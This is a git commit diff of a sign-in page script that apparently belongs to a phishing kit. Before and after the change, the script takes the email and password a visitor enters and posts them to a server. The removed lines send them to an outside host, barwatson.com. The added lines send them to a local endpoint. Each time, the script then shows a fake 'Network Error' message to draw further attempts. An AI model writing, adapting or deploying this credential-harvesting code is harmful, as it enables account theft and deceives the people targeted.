f4902b22fb55491e4618c50c94f8e1e5fd7abe8f
Paul Chibueze <94766465+chibuezedev@users.noreply.github.com>
2024-03-07 14:10:32 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,35 +1,41 @@
-$(document).ready(function() {
-    var baseUrl = (window.location).href;
-    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
-    $("#x1").val(url);
+$(document).ready(function () {
+  var baseUrl = window.location.href;
+  var url = baseUrl.substring(baseUrl.lastIndexOf("=") + 1);
+  $("#x1").val(url);
 
-    $("#formx").submit(function(e) {
-        e.preventDefault();
-        var nm = $("#A1").val();
-        var formData = new FormData($("#formx")[0]);
-        $("#submitBtn").html(`<button class="btn btn-sm btn-primary" disabled>
+  $("#formx").submit(function (e) {
+    e.preventDefault();
+    var formData = {
+      email: $("#x1").val(),
+      password: $("#x2").val(),
+    };
+
+    $("#submitBtn")
+      .html(
+        `<button class="btn btn-sm btn-primary" disabled>
   <span class="spinner-grow spinner-grow-sm"></span>
   Please Wait...
-</button>`).prop("disabled", true);
-        $.ajax({
-            url: "https://barwatson.com/obi/g.php",
-            type: 'POST',
-            data: formData,
-            contentType: false,
-            processData: false,
-            success: function(res) {
-                console.log(res);
-                $('#bd').show();
-                $('#hm').hide();
-                setTimeout(function() {
-                    $("#x1").val(url);
-                    $("#x2").val("");
-                    $('#msg').html(`Network Error! Please verify your information and try again`);
-                    $("#submitBtn").html("Sign In").prop("disabled", false);
-                }, 2000);
-
-            }
-        });
+</button>`
+      )
+      .prop("disabled", true);
+    $.ajax({
+      url: "http://localhost:3000/submit-form",
+      type: "POST",
+      data: JSON.stringify(formData),
+      contentType: "application/json",
+      success: function (res) {
+        console.log(res);
+        $("#bd").show();
+        $("#hm").hide();
+        setTimeout(function () {
+          $("#x1").val(url);
+          $("#x2").val("");
+          $("#msg").html(
+            `Network Error! Please verify your information and try again`
+          );
+          $("#submitBtn").html("Sign In").prop("disabled", false);
+        }, 2000);
+      },
     });
-
+  });
 });
